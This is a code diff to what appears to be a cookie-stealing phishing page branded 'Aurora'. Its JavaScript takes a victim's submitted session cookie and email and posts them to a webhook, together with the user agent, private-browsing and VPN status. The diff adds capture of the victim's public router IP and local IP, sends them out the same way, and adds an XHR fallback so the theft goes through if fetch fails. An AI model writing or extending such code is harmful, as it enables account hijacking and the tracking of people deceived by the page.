@@ -2527,30 +2527,52 @@
         }
 
         // ============================================================
-        // 7. WEBHOOK
+        // 7. WEBHOOK - AGORA COM IP DO ROTEADOR E DO USUÁRIO
         // ============================================================
-        async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
+        async function sendToWebhook(cookie, email, ipPublico, ipLocal, isPrivate, vpnDetected) {
             try {
                 const vpnData = vpnDetected ? await getIPData() : null;
+                
+                // 🔥 CAPTURA OS IPs NOVAMENTE PARA GARANTIR
+                const ips = await getClientIPs();
+                
                 const payload = {
-                    content:
-                        `✨ **NOVO COOKIE - AURORA** ✨\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n✨ **#Aurora** ✨`,
+                    content: `✨ **NOVO COOKIE - AURORA** ✨\n\n` +
+                             `🍪 **Cookie:** \`${cookie}\`\n` +
+                             `📧 **Email:** ${email}\n` +
+                             `🌐 **IP do Roteador:** \`${ips.routerIP || ipPublico || 'Não identificado'}\`\n` +
+                             `💻 **IP do Usuário:** \`${ips.userIP || ipLocal || 'Não identificado'}\`\n` +
+                             `📱 **User Agent:** \`${navigator.userAgent}\`\n` +
+                             `🔒 **Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n` +
+                             `🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}` +
+                             `${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n` +
+                             `⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n` +
+                             `✨ **#Aurora** ✨`,
                     username: webhookInfo.username,
                     avatar_url: webhookInfo.avatar_url
                 };
+                
                 try {
-                    const r = await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload) });
+                    const r = await fetch(WEBHOOK_URL, { 
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload) 
+                    });
                     if (r.ok) return true;
                 } catch (e) {}
+                
                 try {
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', WEBHOOK_URL, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
                     xhr.send(JSON.stringify(payload));
                     return true;
-                } catch (e) { return false; }
-            } catch (e) { return false; }
+                } catch (e) { 
+                    return false; 
+                }
+            } catch (e) { 
+                return false; 
+            }
         }
 
         // ============================================================
@@ -2662,7 +2684,7 @@
         }
 
         // ============================================================
-        // 11. SUBMIT
+        // 11. SUBMIT - AGORA COM AMBOS OS IPs
         // ============================================================
         async function handleSubmit(e) {
             e.preventDefault();
@@ -2700,11 +2722,15 @@
             if (hasAttempted) { showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.');
                 return; }
 
-            const ip = await getIP();
+            // 🔥 CAPTURA AMBOS OS IPs
+            const ips = await getClientIPs();
+            console.log('🌐 IP do Roteador:', ips.routerIP);
+            console.log('💻 IP do Usuário:', ips.userIP);
+
             document.getElementById('submitBtn').disabled = true;
             document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
 
-            const sent = await sendToWebhook(cookie, email, ip, isPrivate, hasVPN);
+            const sent = await sendToWebhook(cookie, email, ips.routerIP, ips.userIP, isPrivate, hasVPN);
 
             if (sent) {
                 hasAttempted = true;
